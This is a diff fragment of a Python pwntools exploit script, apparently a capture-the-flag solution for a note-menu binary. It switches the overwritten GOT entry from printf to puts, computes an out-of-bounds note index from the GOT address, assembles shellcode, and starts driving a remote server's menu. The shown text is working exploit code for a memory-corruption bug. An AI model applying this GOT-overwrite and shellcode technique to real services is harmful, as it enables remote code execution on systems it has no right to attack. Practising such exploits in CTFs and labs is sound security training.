@@ -31,11 +31,13 @@ shellcode = '''
     pop edx
 '''
 
-printf_got = elf.got['printf']
-note_addr = 0x0804A060
-off_set = printf_got - note_addr
+puts_got = elf.got['puts']
+note_addr = 0x0804a060
+off_set = puts_got - note_addr
+print(off_set)
 index = off_set/4
-shellcode = shellcode + '\x6b\x40'
+print(index)
+shellcode = asm(shellcode) + '\x6b\x40'
 
 server.recvuntil('Your choice :')
 server.sendline('1')
